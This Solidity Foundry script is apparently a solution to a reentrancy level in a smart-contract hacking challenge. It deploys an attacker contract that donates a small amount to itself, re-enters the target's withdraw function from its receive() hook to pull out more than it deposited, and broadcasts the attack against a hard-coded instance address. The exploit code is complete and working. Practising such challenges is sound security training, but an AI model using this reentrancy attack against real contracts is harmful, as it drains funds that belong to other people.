// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/10-Reentrancy/Reentrancy.sol";

contract AttackReentrant {
    Reentrance public reentranceInstance;

    constructor(address payable _instance) payable {
        reentranceInstance = Reentrance(_instance);
        // Donate 0.001 to ourselfes
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external {
        // Withdraw the 0.001
        reentranceInstance.withdraw(0.001 ether);
        (bool result,) = msg.sender.call{value: 0.002 ether}("");
        require(result, "Withdraw transfer failed");
    }

    receive() external payable {
        // Reenter and withdraw again the 0.001 of the contract
        reentranceInstance.withdraw(0.001 ether);
    }
}

contract ReentrancySolution is Script {
    address constant INSTANCE = 0x9aE502233705C85BA2774A4Fe194D950033c8F93;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackReentrant attackReentrant = new AttackReentrant{value: 0.001 ether}(payable(INSTANCE));
        attackReentrant.withdraw();
        vm.stopBroadcast();
    }
}
